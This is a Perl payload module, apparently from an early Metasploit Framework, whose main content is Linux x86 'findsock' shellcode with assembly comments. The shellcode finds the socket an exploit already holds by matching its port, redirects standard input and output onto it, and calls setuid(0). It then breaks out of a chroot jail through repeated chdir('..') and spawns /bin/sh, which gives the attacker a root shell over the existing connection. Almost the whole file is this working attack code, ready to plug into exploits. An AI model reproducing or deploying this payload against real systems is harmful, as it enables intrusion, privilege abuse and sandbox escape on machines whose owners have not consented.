package Msf::Payload::linx86_findsock;
use strict;
use base 'Msf::Payload';

my $info =
{
    'Name'         => 'linx86findsock',
    'Version'      => '1.0',
    'Description'  => 'Spawn a shell on the established connection',
    'Author'       => 'LSD [Unknown License]',
    'Arch'         => [ 'x86' ],
    'Priv'         => 0,
    'OS'           => [ 'linux' ],
    'Multistage'   => 0,
    'Type'         => 'findsock_shell',
    'Size'         => '',
    'UserOpts'     =>
        {
            'CPORT' => [1, 'PORT', 'Local port used by exploit'],
        }
};

sub new {
    my $class = shift;
    my $self = $class->SUPER::new({'Info' => $info}, @_);
    $self->{'Info'}->{'Size'} = $self->_GenSize;
    return($self);
}

sub Build {
    my $self = shift;
    return($self->Generate($self->GetVar('CPORT')));
}

sub Generate
{
    my $self = shift;
    my $port = shift;
    my $off_port = 46;
    my $port_bin = pack("n", $port);

    my $shellcode = # linux findsock code by lsd
    # char findsckcode[]=    # /* 72 bytes                     */
    "\x31\xdb"             . # /* xorl    %ebx,%ebx              */
    "\x89\xe7"             . # /* movl    %esp,%edi              */
    "\x8d\x77\x10"         . # /* leal    0x10(%edi),%esi        */
    "\x89\x77\x04"         . # /* movl    %esi,0x4(%edi)         */
    "\x8d\x4f\x20"         . # /* leal    0x20(%edi),%ecx        */
    "\x89\x4f\x08"         . # /* movl    %ecx,0x8(%edi)         */
    "\xb3\x10"             . # /* movb    $0x10,%bl              */
    "\x89\x19"             . # /* movl    %ebx,(%ecx)            */
    "\x31\xc9"             . # /* xorl    %ecx,%ecx              */
    "\xb1\xff"             . # /* movb    $0xff,%cl              */
    "\x89\x0f"             . # /* movl    %ecx,(%edi)            */
    "\x51"                 . # /* pushl   %ecx                   */
    "\x31\xc0"             . # /* xorl    %eax,%eax              */
    "\xb0\x66"             . # /* movb    $0x66,%al              */
    "\xb3\x07"             . # /* movb    $0x07,%bl              */
    "\x89\xf9"             . # /* movl    %edi,%ecx              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x59"                 . # /* popl    %ecx                   */
    "\x31\xdb"             . # /* xorl    %ebx,%ebx              */
    "\x39\xd8"             . # /* cmpl    %ebx,%eax              */
    "\x75\x0a"             . # /* jne     <findsckcode+54>       */
    "\x66\xb8\x12\x34"     . # /* movw    $0x1234,%bx            */
    "\x66\x39\x46\x02"     . # /* cmpw    %bx,0x2(%esi)          */
    "\x74\x02"             . # /* je      <findsckcode+56>       */
    "\xe2\xe0"             . # /* loop    <findsckcode+24>       */
    "\x89\xcb"             . # /* movl    %ecx,%ebx              */
    "\x31\xc9"             . # /* xorl    %ecx,%ecx              */
    "\xb1\x03"             . # /* movb    $0x03,%cl              */
    "\x31\xc0"             . # /* xorl    %eax,%eax              */
    "\xb0\x3f"             . # /* movb    $0x3f,%al              */
    "\x49"                 . # /* decl    %ecx                   */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x41"                 . # /* incl    %ecx                   */
    "\xe2\xf6"             . # /* loop    <findsckcode+62>       */
    
    # char setuidcode[]=     # /* 8 bytes                        */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x31\xdb"             . # /* xorl    %ebx,%ebx              */
    "\xb0\x17"             . # /* movb    $0x17,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */

    # char chrootcode[]=     # /* 37 bytes                       */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x68bb.."             . # /* pushl   $0x2e2e6262            */
    "\x89\xe3"             . # /* movl    %esp,%ebx              */
    "\x43"                 . # /* incl    %ebx                   */
    "\x33\xc9"             . # /* xorl    %ecx,%ecx              */
    "\xb0\x27"             . # /* movb    $0x27,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x33\xc0"             . # /* xorl    %eax,%eax              */
    "\xb0\x3d"             . # /* movb    $0x3d,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\x43"                 . # /* incl    %ebx                   */
    "\xb1\xff"             . # /* movb    $0xff,%cl              */
    "\xb0\x0c"             . # /* movb    $0x0c,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    "\xe2\xfa"             . # /* loop    <chrootcode+21>        */
    "\x43"                 . # /* incl    %ebx                   */
    "\xb0\x3d"             . # /* movb    $0x3d,%al              */
    "\xcd\x80"             . # /* int     $0x80                  */
    
    # char shellcode[]=    . # /* 24 bytes                       */
    "\x31\xc0"             . # /* xorl    %eax,%eax              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x68//sh"             . # /* pushl   $0x68732f2f            */
    "\x68/bin"             . # /* pushl   $0x6e69622f            */
    "\x89\xe3"             . # /* movl    %esp,%ebx              */
    "\x50"                 . # /* pushl   %eax                   */
    "\x53"                 . # /* pushl   %ebx                   */
    "\x89\xe1"             . # /* movl    %esp,%ecx              */
    "\x99"                 . # /* cdql                           */
    "\xb0\x0b"             . # /* movb    $0x0b,%al              */
    "\xcd\x80"             ; # /* int     $0x80                  */


    substr($shellcode, $off_port, 2, $port_bin);
    return $shellcode;
}

sub _GenSize
{
    my $self = shift;
    my $bin = $self->Generate('4444');
    return length($bin);
}
